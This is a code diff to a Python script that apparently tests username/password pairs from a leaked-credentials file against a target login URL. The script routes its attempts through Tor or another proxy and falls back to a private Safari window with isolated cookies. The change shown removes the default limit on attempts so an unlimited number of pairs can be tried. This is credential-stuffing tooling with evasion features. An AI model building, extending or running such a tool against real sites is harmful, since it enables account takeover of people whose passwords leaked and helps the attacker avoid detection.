@@ -437,7 +437,7 @@ def main():
     ap.add_argument("--private", action="store_true", help="Run the Safari fallback in a NEW PRIVATE window "
                                                            "(isolated cookies, discarded when closed)")
     ap.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Seconds between attempts (default 10)")
-    ap.add_argument("--max", type=int, default=MAX_ATTEMPTS, help="Maximum pairs to test (default 20)")
+    ap.add_argument("--max", type=int, default=MAX_ATTEMPTS, help="Maximum pairs to test (default 20; 0 = unlimited)")
     ap.add_argument("--proxy", default=None, help="Proxy for all attempts (e.g. socks5h://127.0.0.1:9050 for Tor, "
                                                   "http://127.0.0.1:8080). Safari fallback ignores this.")
     args = ap.parse_args()
@@ -446,7 +446,8 @@ def main():
     if not pairs:
         print(f"[!] No username/password pairs found in {args.leaks}")
         sys.exit(1)
-    pairs = pairs[:args.max]
+    if args.max > 0:
+        pairs = pairs[:args.max]
     print(f"[*] {len(pairs)} unique pair(s) to test against {args.url}")
 
     host = urlparse(args.url).netloc
